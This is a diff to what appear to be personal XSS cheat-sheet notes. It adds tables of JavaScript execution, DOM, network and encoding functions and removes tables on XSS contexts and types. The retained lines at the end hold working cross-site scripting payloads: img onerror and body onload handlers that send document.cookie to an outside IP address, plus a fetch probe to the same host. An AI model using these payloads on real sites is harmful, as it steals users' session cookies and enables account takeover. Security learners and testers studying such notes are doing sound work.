@@ -1,8 +1,72 @@
 # XSS PAYLOADS
 
 -
+# JavaScript XSS Reference
 
-# XSS HTML Element Reference
+## Execution
+
+| Function | Purpose |
+|----------|---------|
+| `eval()` | Executes JavaScript code |
+| `Function()` | Creates and runs JavaScript functions |
+| `setTimeout()` | Executes code after delay |
+| `setInterval()` | Executes code repeatedly |
+
+---
+
+## DOM
+
+| Object / Property | Purpose |
+|-------------------|---------|
+| `document` | Access webpage DOM |
+| `document.cookie` | Access cookies |
+| `document.URL` | Get current URL |
+| `document.body` | Access page body |
+| `innerHTML` | Read/write HTML |
+| `document.write()` | Write HTML to page |
+
+---
+
+## Network
+
+| Function | Purpose |
+|----------|---------|
+| `fetch()` | Send HTTP requests |
+| `XMLHttpRequest` | Make HTTP requests |
+| `navigator.sendBeacon()` | Send background requests |
+
+---
+
+## Browser Objects
+
+| Object | Purpose |
+|--------|---------|
+| `window` | Browser environment |
+| `location` | URL/navigation control |
+| `navigator` | Browser information |
+| `localStorage` | Browser storage |
+
+---
+
+## Encoding
+
+| Function | Purpose |
+|----------|---------|
+| `atob()` | Decode Base64 |
+| `btoa()` | Encode Base64 |
+| `decodeURIComponent()` | Decode URL strings |
+| `encodeURIComponent()` | Encode URL strings |
+
+---
+
+## DOM Creation
+
+| Function | Purpose |
+|----------|---------|
+| `createElement()` | Create HTML elements |
+| `appendChild()` | Add elements to DOM |
+| `removeChild()` | Remove elements |
+# HTML Element Reference
 
 ## Auto-Triggered Events
 
@@ -37,28 +101,6 @@
 
 ---
 
-## XSS Contexts
-
-| Context | Example |
-|---------|---------|
-| HTML | `<div>INPUT</div>` |
-| Attribute | `<input value="INPUT">` |
-| JavaScript | `<script>INPUT</script>` |
-| CSS | `<style>INPUT</style>` |
-| URL | `href="INPUT"` / `src="INPUT"` |
-
----
-
-## XSS Types
-
-| Type | Description |
-|------|-------------|
-| Reflected | Input is returned immediately in the response |
-| Stored | Input is saved and shown to users later |
-| DOM-Based | Client-side JavaScript processes the input |
-
-
-<img src=x onerror="xss_PAYLOAD">
 <img src=x onerror="fetch('http://192.168.160.106:8000/test.png')">
 <img src=x onerror="window.location='http://192.168.160.106:8000/?cookie='+document.cookie;">
 username=<body onload=\"new Image().src='http://192.168.160.106:8080?c='+document.cookie;\">
